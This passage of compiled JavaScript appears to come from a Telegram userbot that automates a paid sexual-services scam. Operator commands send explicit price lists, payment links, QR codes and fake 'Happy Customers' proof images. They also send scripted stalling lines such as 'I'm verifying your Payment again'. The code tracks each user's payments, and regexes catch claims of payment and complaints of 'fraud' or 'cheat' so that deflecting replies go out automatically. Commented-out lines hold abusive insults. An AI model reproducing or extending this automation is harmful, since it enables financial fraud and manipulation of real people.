                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: `How is the Demo?♥️🙈` });
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield event.client.sendMessage(chatId, { message: `**Take Full Show Baby...!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**` });
                        setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                            yield event.client.sendMessage(chatId, { message: `${messages_1.payLinks.phonepe3}\n${messages_1.payLinks.paytm1}\n${messages_1.payLinks.gpay1}\n\n<b>I'm Waiting without dress for you!😚😚</b>`, parseMode: 'html', linkPreview: false });
                        }), 8000);
                    }), 15000);
                    yield db.update(chatId, { paidReply: true, limitTime: Date.now(), totalCount: 10, demoGiven: true, payAmount: 50 });
                    yield db.createOrUpdateStats(chatId, 'any', 10, false, true, true, false);
                    yield db.updateStatSingleKey(chatId, 'demoGivenToday', true);
                }
                else if (text === 'hsl') {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: `How is it?🙈` });
                    const userDetails = yield db.read(chatId);
                    yield db.update(chatId, { paidReply: true, limitTime: Date.now() + (2 * 60 * 1000), demoGiven: true, payAmount: 150, totalCount: 9, secondShow: true });
                    yield db.createOrUpdateStats(chatId, 'any', 150, false, true, true, true);
                }
                else if (text === 'psy') {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: `**Take Full Show Baby...!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**` });
                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                        yield event.client.sendMessage(chatId, { message: `${messages_1.payLinks.phonepe3}\n${messages_1.payLinks.paytm1}\n${messages_1.payLinks.gpay1}\n\n<b>I'm Waiting without dress for you!😚😚</b>`, parseMode: 'html', linkPreview: false });
                    }), 11000);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, true);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.limitTime, Date.now());
                }
                else if (text === 'tgpon') {
                    yield (0, utils_1.deleteMessage)(event);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, true);
                    yield db.updateStatSingleKey(event.message.chatId.toString(), 'paidReply', true);
                }
                else if (text === 'tgpof') {
                    yield (0, utils_1.deleteMessage)(event);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, false);
                    yield db.updateStatSingleKey(event.message.chatId.toString(), 'paidReply', false);
                }
                else if (text === 'bp') {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: `<b>Pay to this links!!👇🏻👇🏻</b>\n\n${messages_1.payLinks.phonepe2}\n${messages_1.payLinks.paytm1}`, parseMode: 'html', linkPreview: false });
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, true);
                }
                else if (text === `dir`) {
                    yield event.client.sendMessage(chatId, {
                        message: `**Open 👉🏻 ${process.env.demolink}**`
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `demo`) {
                    yield event.client.sendMessage(chatId, {
                        message: "**No FREE Demos!!**\n\n**DEMO** Nude pics: **25₹**\n**DEMO** Video call: **50₹**\n**DEMO** Voice call: **40₹**"
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `..`) {
                    const grtng = "Hii  **" + messages_1.messages.nameGreet;
                    try {
                        yield event.client.sendMessage(receiver, { message: grtng + messages_1.messages.greeting });
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                    }
                    yield event.client.sendMessage(chatId, {
                        message: `**My Videos/Updates Link:\n\nJOIN 👉🏻 @${process.env.channelLink}\nOPEN 👉🏻 ${process.env.link}**`
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `full`) {
                    yield event.client.sendMessage(chatId, {
                        message: "**Full Service**\n\nSex chat                     :  **150₹/-**\n30 Full Nude Pics     :  **200₹**/-\n7 Full Nude Videos   :  **400₹/-**\nVoicecall sex             :   **350₹/-**\n\n**Full Nude Video call**  : **600₹/-**  (1 hour)"
                    });
                    yield (0, Helpers_1.sleep)(900);
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.installments });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `ntnw`) {
                    yield event.client.sendMessage(chatId, {
                        message: "Not now,\n\n**First take Online Service....!!🤗**\nIf I like your Behaviour and If i get satisfied with your **Video Call**...😚😚\n\nI will give you **My Address** and **NUMBER**."
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (`upi!!` === text) {
                    yield event.client.sendMessage(chatId, {
                        message: "Pay to my UPI Adress\n\nCopy paste full Msg👇🏻👇🏻👇🏻👇🏻"
                    });
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.upiID });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (`link` === text) {
                    yield event.client.sendMessage(chatId, { message: `**OPEN 👉🏻 ${process.env.link}**` });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (`sct` === text) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.screenshot });
                }
                else if (text === `sml`) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: "**30 Mins VideoCall   :  350₹/-\n1 hour Full   :   600₹/-**" });
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, true);
                }
                else if (text === `inc`) {
                    (0, index_1.requestCall)(event.message.chatId.toString());
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `dns`) {
                    yield (0, utils_1.deleteMessage)(event);
                    const userDetails = yield db.read(event.message.chatId.toString());
                    if (userDetails.payAmount >= 30) {
                        if (!userDetails.demoGiven) {
                            const didPaidToOthers = yield db.checkIfPaidToOthers(event.message.chatId.toString());
                            if (didPaidToOthers.paid !== "" || didPaidToOthers.paid !== "") {
                                yield event.client.sendMessage(chatId, { message: `Wait...\nI'm verifying your Payment again!!\n${didPaidToOthers.paid !== "" ? (`I think U paid to ${didPaidToOthers.paid} and U also`) : "I think U"}  ${didPaidToOthers.demoGiven !== "" ? (` took Demo from ${didPaidToOthers.demoGiven}`) : ""}` });
                            }
                            else {
                                yield event.client.sendMessage(chatId, { message: "Dont Speak Okay!!\nI'm in **Bathroom**\nMute yourself!! I will show you Okay..!!" });
                            }
                        }
                        else {
                            if (userDetails.payAmount > 50) {
                                if (!userDetails.secondShow || userDetails.payAmount > 180) {
                                    yield event.client.sendMessage(chatId, { message: "Mute ok.. I Will Call now!!" });
                                }
                                else if (userDetails.payAmount < 201) {
                                    yield event.client.sendMessage(chatId, { message: "**Did you like the full Show??**" });
                                    setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                        yield event.client.sendMessage(chatId, { message: "**30 Mins VideoCall   :  350₹/-\n1 hour Full   :   600₹/-**" });
                                    }), 3000);
                                }
                            }
                            else {
                                yield event.client.sendMessage(chatId, { message: "**Your Demo is Over Baby!!\nPay Again! if You want More....**" });
                                setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                    yield event.client.sendMessage(chatId, { message: `**Take Full Show Baby...!!**\nPussy also!!\n\nWithout Face : **100₹**\nWith Face      : **150₹**` });
                                }), 3000);
                            }
                        }
                    }
                    else {
                        if (userDetails.payAmount > 15) {
                            yield event.client.sendMessage(chatId, { message: messages_1.messages.noFreeDemo + "\n\n" + messages_1.messages.demo });
                        }
                        else if (userDetails.payAmount > 10) {
                            yield event.client.sendMessage(chatId, { message: "I have sent you Pics for your money\nCall is **50Rs**\n\nPay and msg!!\nElse I will block you!!" });
                        }
                        else {
                            yield event.client.sendMessage(chatId, { message: "Did u Pay??\nWait I'm checking your payment!!" });
                        }
                    }
                    yield db.updateStatSingleKey(event.message.chatId.toString(), 'paidReply', false);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, false);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.limitTime, Date.now() + 30 * 60 * 1000);
                }
                else if (text === `ew`) {
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.cantPay });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `dp`) {
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.dp });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `.`) {
                    yield event.client.sendFile(receiver, {
                        file: (0, common_1.getClientFilePath)(`./pic.jpg`),
                        caption: `Take the Demo For more!!`
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `prf`) {
                    yield event.client.sendMessage(chatId, { file: [(0, common_1.getClientFilePath)('./prf1.jpg'), (0, common_1.getClientFilePath)('./prf2.jpg')], message: 'Happy Customers👆' });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `dmp`) {
                    yield event.client.sendMessage(chatId, {
                        file: [(0, common_1.getClientFilePath)('./dmp1.jpg'), (0, common_1.getClientFilePath)('./dmp2.jpg'), (0, common_1.getClientFilePath)('./dmp3.jpg'), (0, common_1.getClientFilePath)('./dmp4.jpg')],
                        message: "Take Demo Video Call, I Will show you Directly!!\nI'm not wearing clothes now!!♥️🙈\n\n**Just 50₹!!**"
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === 'vc') {
                    yield event.client.sendFile(receiver, {
                        file: (0, common_1.getClientFilePath)(`./voice.mp3`),
                        caption: `Listen My Voice!!`,
                        voiceNote: true
                    });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `aut`) {
                    yield event.client.sendMessage(chatId, { message: messages_1.messages.aut + "\nI have received your money!!\nI will give you service, Please Wait!!" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `pvc`) {
                    yield event.client.sendMessage(chatId, { message: "Change Your Call Settings\n\nPrivacy Settings... I'm unable to call..!!" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `flt`) {
                    yield event.client.sendMessage(chatId, { message: "Flight Mode ON and OFF....!!\n\nThen it will work!" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `rstm`) {
                    yield event.client.sendMessage(chatId, { message: "Close your Telegram from Recent Apps and re-open!!\n\nThen it will Work!!" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `org`) {
                    yield event.client.sendMessage(chatId, { message: "Use **Original Telegram** only, Dont use **Telegram-X** !!" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `dmvr`) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendMessage(chatId, { message: "**Your Demo is Over Baby!!**\nPay again if u want more**\n\nNo MONEY? then No SERVICE!!\nDont WASTE your TIME!!**" });
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.paidReply, true);
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.demoGiven, true);
                    yield db.updateStatSingleKey(event.message.chatId.toString(), 'paidReply', true);
                }
                else if (text === `qr`) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendFile(receiver, { file: (0, common_1.getClientFilePath)('./QR.jpg'), caption: `${messages_1.messages.qr}\n\n${messages_1.messages.link}` });
                }
                else if (text === `qr1`) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendFile(receiver, { file: (0, common_1.getClientFilePath)('./QR1.jpg'), caption: `${messages_1.messages.qr}\n\n${messages_1.messages.link}` });
                }
                else if (text === `qr2`) {
                    yield (0, utils_1.deleteMessage)(event);
                    yield event.client.sendFile(receiver, { file: (0, common_1.getClientFilePath)('./QR2.jpg'), caption: `${messages_1.messages.qr}\n\n${messages_1.messages.link}` });
                }
                else if (text === `gp`) {
                    yield event.client.sendMessage('me', { message: yield db.getPaidList() });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `rls`) {
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.canReply, 1);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `rst`) {
                    yield db.updateSingleKey(event.message.chatId.toString(), dbservice_1.user.canReply, 0);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `cln`) {
                    yield (0, utils_1.callOn)(event.client, event.message.chatId);
                    yield event.client.sendMessage(chatId, { message: "**U Only Call Me!!**" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `clf`) {
                    yield (0, utils_1.calloff)(event.client);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith(`respaid`)) {
                    const msg = message.text.split(':')[1];
                    yield (0, utils_1.respToPaidPplfn)(event.client, 5000, msg, false);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith(`asktp`)) {
                    yield (0, utils_1.asktoPay)(event.client, 1000);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text.startsWith(`resp`)) {
                    const msg = message.text.split(':')[1];
                    yield (0, utils_1.respToPaidPplfn)(event.client, 5000, msg);
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `ntd`) {
                    yield event.client.sendMessage(chatId, { message: "Not in Demo!!\nTake Full Service Baby...!!\n**I will Show you Everthing in Full Service!!**" });
                    yield (0, utils_1.deleteMessage)(event);
                }
                else if (text === `getlist`) {
                    let msg = '/';
                    // chatkeys.map(() => {
                    //     msg = msg + '\n';
                    // })
                    yield event.client.sendMessage(chatId, { message: msg });
                }
                // console.log(`${process.env.username} : `, text)
            }
            catch (e) {
                console.log(e);
            }
        }
    });
}


/***/ }),

/***/ "./src/phonestate.ts":
/*!***************************!*\
  !*** ./src/phonestate.ts ***!
  \***************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.generateEmojiFingerprint = generateEmojiFingerprint;
exports.createPhoneCallState = createPhoneCallState;
exports.destroyPhoneCallState = destroyPhoneCallState;
exports.encodePhoneCallData = encodePhoneCallData;
exports.decodePhoneCallData = decodePhoneCallData;
exports.confirmPhoneCall = confirmPhoneCall;
exports.acceptPhoneCall = acceptPhoneCall;
exports.requestPhoneCall = requestPhoneCall;
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const MTProtoState_1 = __webpack_require__(/*! telegram/network/MTProtoState */ "telegram/network/MTProtoState");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const Helpers = __importStar(__webpack_require__(/*! telegram/Helpers */ "telegram/Helpers"));
const AuthKey_1 = __webpack_require__(/*! telegram/crypto/AuthKey */ "telegram/crypto/AuthKey");
let currentPhoneCallState;
class PhoneCallState {
    constructor() {
        this.seq = 0;
        this.waitForState = new Promise((resolve) => {
            this.resolveState = resolve;
        });
    }
    requestCall(_a) {
        return __awaiter(this, arguments, void 0, function* ({ p, g, random }) {
            const pBN = Helpers.readBigIntFromBuffer(Buffer.from(p), false);
            const randomBN = Helpers.readBigIntFromBuffer(Buffer.from(random), false);
            const gA = Helpers.modExp((0, big_integer_1.default)(g), randomBN, pBN);
            this.gA = gA;
            this.p = pBN;
            this.random = randomBN;
            const gAHash = yield Helpers.sha256(Helpers.getByteArray(gA));
            return Array.from(gAHash);
        });
    }
    acceptCall({ p, g, random }) {
        const pLast = Helpers.readBigIntFromBuffer(p, false);
        const randomLast = Helpers.readBigIntFromBuffer(random, false);
        const gB = Helpers.modExp((0, big_integer_1.default)(g), randomLast, pLast);
        this.gB = gB;
        this.p = pLast;
        this.random = randomLast;
        return Array.from(Helpers.getByteArray(gB));
    }
    confirmCall(gB) {
        return __awaiter(this, void 0, void 0, function* () {
            this.gB = Helpers.readBigIntFromBuffer(Buffer.from(gB), false);
            const authKey = Helpers.modExp(this.gB, this.random, this.p);
            const fingerprint = yield Helpers.sha1(Helpers.getByteArray(authKey));
            const keyFingerprint = Helpers.readBigIntFromBuffer(fingerprint.slice(-8).reverse(), false);
            const key = new AuthKey_1.AuthKey();
            yield key.setKey(Helpers.getByteArray(authKey));
            this.state = new MTProtoState_1.MTProtoState(key, new Logger_1.Logger(), true);
            this.resolveState();
            return { gA: Array.from(Helpers.getByteArray(this.gA)), keyFingerprint: keyFingerprint.toString() };
        });
    }
    encode(data) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.state)
                return undefined;
            const seqArray = new Uint32Array(1);
            seqArray[0] = this.seq++;
            const encodedData = yield this.state.encryptMessageData(Buffer.concat([Helpers.convertToLittle(Buffer.from(seqArray)), Buffer.from(data)]));
            return Array.from(encodedData);
        });
    }
    decode(data) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.state) {
                return this.waitForState.then(() => {
                    return this.decode(data);
                });
            }
            const message = yield this.state.decryptMessageData(Buffer.from(data));
            return JSON.parse(message.toString());
        });
    }
}
function computeEmojiIndex(bytes) {
    return (((0, big_integer_1.default)(bytes[0]).and(0x7F)).shiftLeft(56))
        .or(((0, big_integer_1.default)(bytes[1]).shiftLeft(48)))
        .or(((0, big_integer_1.default)(bytes[2]).shiftLeft(40)))
        .or(((0, big_integer_1.default)(bytes[3]).shiftLeft(32)))
        .or(((0, big_integer_1.default)(bytes[4]).shiftLeft(24)))
        .or(((0, big_integer_1.default)(bytes[5]).shiftLeft(16)))
        .or(((0, big_integer_1.default)(bytes[6]).shiftLeft(8)))
        .or(((0, big_integer_1.default)(bytes[7])));
}
function generateEmojiFingerprint(authKey, gA, emojiData, emojiOffsets) {
    return __awaiter(this, void 0, void 0, function* () {
        const hash = yield Helpers.sha256(Buffer.concat([new Uint8Array(authKey), new Uint8Array(gA)]));
        const result = [];
        const emojiCount = emojiOffsets.length - 1;
        const kPartSize = 8;
        for (let partOffset = 0; partOffset !== hash.byteLength; partOffset += kPartSize) {
            const value = computeEmojiIndex(hash.subarray(partOffset, partOffset + kPartSize));
            const index = value.modPow(1, emojiCount).toJSNumber();
            const offset = emojiOffsets[index];
            const size = emojiOffsets[index + 1] - offset;
            result.push(String.fromCharCode(...emojiData.subarray(offset, offset + size)));
        }
        return result.join('');
    });
}
function createPhoneCallState() {
    currentPhoneCallState = new PhoneCallState();
}
function destroyPhoneCallState() {
    console.log("Delete Call State!!");
    currentPhoneCallState = undefined;
}
function encodePhoneCallData(params) {
    return currentPhoneCallState.encode(params);
}
function decodePhoneCallData(params) {
    return currentPhoneCallState.decode(params);
}
function confirmPhoneCall(params) {
    return currentPhoneCallState === null || currentPhoneCallState === void 0 ? void 0 : currentPhoneCallState.confirmCall(params);
}
function acceptPhoneCall(params) {
    return currentPhoneCallState === null || currentPhoneCallState === void 0 ? void 0 : currentPhoneCallState.acceptCall(params);
}
function requestPhoneCall(params) {
    return currentPhoneCallState === null || currentPhoneCallState === void 0 ? void 0 : currentPhoneCallState.requestCall(params);
}


/***/ }),

/***/ "./src/respondToMsgs.ts":
/*!******************************!*\
  !*** ./src/respondToMsgs.ts ***!
  \******************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.respondToMsgs = respondToMsgs;
exports.pushToReplies = pushToReplies;
exports.localMsgStats = localMsgStats;
exports.replier = replier;
exports.getReplierState = getReplierState;
exports.sendTpMsg = sendTpMsg;
exports.getMsgStats = getMsgStats;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const errors_1 = __webpack_require__(/*! telegram/errors */ "telegram/errors");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const dbservice_1 = __webpack_require__(/*! ./dbservice */ "./src/dbservice.ts");
const inhandlerUpdated_1 = __webpack_require__(/*! ./inhandlerUpdated */ "./src/inhandlerUpdated.ts");
const messages_1 = __webpack_require__(/*! ./messages */ "./src/messages.ts");
const utils_1 = __webpack_require__(/*! ./utils */ "./src/utils.ts");
const index_1 = __webpack_require__(/*! ./index */ "./src/index.ts");
const fs_1 = __importDefault(__webpack_require__(/*! fs */ "fs"));
const sendGreetings_1 = __webpack_require__(/*! ./sendGreetings */ "./src/sendGreetings.ts");
const cloudinaryService_1 = __importDefault(__webpack_require__(/*! ./cloudinaryService */ "./src/cloudinaryService.ts"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
const respondToPaidMessages_1 = __webpack_require__(/*! ./respondToPaidMessages */ "./src/respondToPaidMessages.ts");
const messageParse_1 = __webpack_require__(/*! telegram/client/messageParse */ "telegram/client/messageParse");
const withTimeout_1 = __webpack_require__(/*! ./utils/withTimeout */ "./src/utils/withTimeout.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ./utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const parseError_1 = __webpack_require__(/*! ./utils/parseError */ "./src/utils/parseError.ts");
const logbots_1 = __webpack_require__(/*! ./utils/logbots */ "./src/utils/logbots.ts");
const common_1 = __webpack_require__(/*! ./common */ "./src/common.ts");
const tpMap = new Map();
const repingMap = new Map();
const picMap = new Map();
const repliesArr = [];
const db = dbservice_1.UserDataDtoCrud.getInstance();
let sleepTime = 0;
let globalSleepTime = Date.now();
const paymentDoneRegex = new RegExp(`(\\b((pay(ment|mnt)|amount|amnt|amt|pais(a|e)|pay|money|mny|trans(action|actn)|(already|alrdy))\\b.*?\\b(sent|(done|dn|over|ovr)|(paid)|(complete|cmplt|completed)|(bhej(a|di(|ya|ye))|k(ar|r)d(iye|iya|iya|idya)|hog(aya|aye|ya))))\\b)|
    `, 'i');
const paymentDoneRevRegex = new RegExp(`(\\b(sent|(done|dn|over|ovr)|(paid)|(complete|cmplt|completed)|(bhej(a|di(|ya|ye))|k(ar|r)d(iye|iya|iya|idya)|hog(aya|aye|ya)))\\b.*?\\b(pay(ment|mnt)|amount|amnt|amt|pais(a|e)|pay|money|mny|trans(action|actn)|(already|alrdy))\\b)`, 'i');
function respondToMsgs(event, allMsg) {
    return __awaiter(this, void 0, void 0, function* () {
        var _a, _b, _c, _d;
        const text = allMsg.toLowerCase();
        const chatId = (_a = event === null || event === void 0 ? void 0 : event.chatId) === null || _a === void 0 ? void 0 : _a.toString();
        const senderJson = yield (0, utils_1.getSenderJson)(event);
        const broadcastName = senderJson.username ? senderJson.username : senderJson.firstName;
        let userDetails = yield db.read(chatId);
        if (userDetails.totalCount > 3 && userDetails.totalCount % 7 == 0) {
            const mesg = `${(0, messages_1.pickOneMsg)(messages_1.messages.initMsgs)}\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.PayMsgArray)}`;
            yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, false, mesg);
        }
        if (userDetails.canReply && userDetails.totalCount < 100 && userDetails.limitTime < Date.now()) {
            if (userDetails.payAmount >= 25 || userDetails.paidCount > 2) {
                if ((userDetails.secondShow || userDetails.fullShow > 1) &&
                    ((userDetails.payAmount < 250 && userDetails.callTime < Date.now() - 20 * 60 * 60 * 1000) ||
                        (userDetails.payAmount >= 250 && userDetails.callTime < Date.now() - 30 * 60 * 60 * 1000))) {
                    userDetails = yield db.update(userDetails.chatId, { payAmount: 50, secondShow: false, fullShow: 0, highestPayAmount: 50, callTime: 0 });
                }
                if (!userDetails.paidReply && userDetails.callTime < Date.now() - 60 * 60 * 1000) {
                    yield db.updateSingleKey(chatId, dbservice_1.user.paidReply, true);
                    yield (0, utils_1.asktoPayByEvent)(event.client, userDetails, true);
                }
                else {
                    if (userDetails.paidReply) {
                        if (userDetails.videos.length < 10 && ((0, utils_1.isServicePending)(userDetails))) {
                            if (userDetails.highestPayAmount < 250) {
                                if (userDetails.callTime == 0 || userDetails.callTime < Date.now() - 20 * 60 * 1000 || (0, inhandlerUpdated_1.contains)(text, ['call', 'reply', 'please', 'pls', 'complete', 'finish', 'respond', 'cheat', 'fake', 'fraud', 'paid', 'answer']) ||
                                    paymentDoneRegex.test(text) || paymentDoneRevRegex.test(text)) {
                                    try {
                                        (0, index_1.initiateCall)(userDetails.payAmount, userDetails, "Re-Requested Call");
                                        //await fetchWithTimeout(`${process.env.uptimebot}/requestCall?clientId=${process.env.clientId?.toLowerCase()}&chatId=${chatId}&type=${userDetails.callTime ? "2" : "1"}`);
                                    }
                                    catch (error) {
                                        console.log('Cannot request Another call', error);
                                    }
                                }
                                else {
                                    yield (0, respondToPaidMessages_1.respondToPaidMsgs)(event, allMsg);
                                }
                            }
                            else {
                                if (userDetails.callTime < Date.now() - 2 * 60 * 60 * 1000 ||
                                    (0, inhandlerUpdated_1.contains)(text, ['cal', 'reply', 'please', 'pls', 'complete', 'finish', 'respond', 'cheat', 'fake', 'fraud', 'paid', 'answer']) ||
                                    paymentDoneRegex.test(text) || paymentDoneRevRegex.test(text)) {
                                    if (userDetails.callTime < Date.now() - 1 * 60 * 60 * 1000) {
                                        userDetails.payAmount = userDetails.highestPayAmount;
                                        try {
                                            (0, index_1.initiateCall)(userDetails.payAmount, userDetails, "Re-Requested Call 2");
                                            // await fetchWithTimeout(`${process.env.uptimebot}/requestCall?clientId=${process.env.clientId?.toLowerCase()}&chatId=${chatId}&type=${userDetails.callTime ? "2" : "1"}`);
                                        }
                                        catch (error) {
                                            console.log('Cannot request Another call', error);
                                        }
                                    }
                                    else {
                                        try {
                                            yield event.client.sendMessage(chatId, { message: `Lets do it after 1 hour okay??\n\n${(0, messages_1.pickOneMsg)(messages_1.messages.awayMessges)}` });
                                            yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + 40 * 60 * 1000);
                                            yield db.updateSingleKey(chatId, dbservice_1.user.paidReply, false);
                                        }
                                        catch (error) {
                                            (0, parseError_1.parseError)(error, "some123", false);
                                        }
                                    }
                                }
                                else {
                                    yield (0, respondToPaidMessages_1.respondToPaidMsgs)(event, allMsg);
                                }
                            }
                        }
                        else {
                            yield (0, respondToPaidMessages_1.respondToPaidMsgs)(event, allMsg);
                        }
                    }
                }
            }
            else {
                try {
                    if (userDetails.totalCount > 13 && userDetails.totalCount < 16 && !picMap.has((event.message.chatId.toString()))) {
                        picMap.set(event.message.chatId.toString(), true);
                        yield pushToReplies(event, chatId, `Want more...?\n\nCall  Just **50₹**\nPics Just **25₹!!**\n**Full NUDE, With FACE!!\n\n${process.env.demolink}/${process.env.clientId}**`, (0, common_1.getClientFilePath)(`./pic.jpg`));
                    }
                    if ((0, inhandlerUpdated_1.contains)(text, ['bitch', 'lanj', 'rand', 'get lost', 'go away', 'no need', 'leave', 'not intres', 'no intres', 'no money'])) {
                        yield (0, inhandlerUpdated_1.respond)(event, [messages_1.messages.bye]);
                        yield db.updateSingleKey(chatId, dbservice_1.user.limitTime, Date.now() + (5 * 60 * 1000));
                        // const canReply: number = await db.getSingleKey(chatId, user.canReply);
                        //     await respond(event, [messages.cantPay])
                        // if (canReply === undefined || canReply < 3) {
                        //     await respond(event, [messages.cantPay])
                        //     // await withTimeout(event.client.sendMessage(chatId,{ message: "U Ugly Dick!!\nU cant just Fuck with your ugly small Dick!!\nEarn Some money and Get back here!!\n\n**Poor motherFucker!!**" })
                        // } else {
                        //     await respond(event, ['Dont Scold You MotherFucker!!\n\nYou Dont Get anything for FREE!!\nJust get lost,Dont Waste your Time Msging me,I will not give anything free for poor Mother Fuckers Like you!!']);
                        //     await db.updateSingleKey(chatId, user.limitTime, Math.max(userDetails.limitTime, Date.now() + 100000));
                        // }
                        // await db.updateSingleKey(chatId, user.canReply, canReply + 1);
                    }
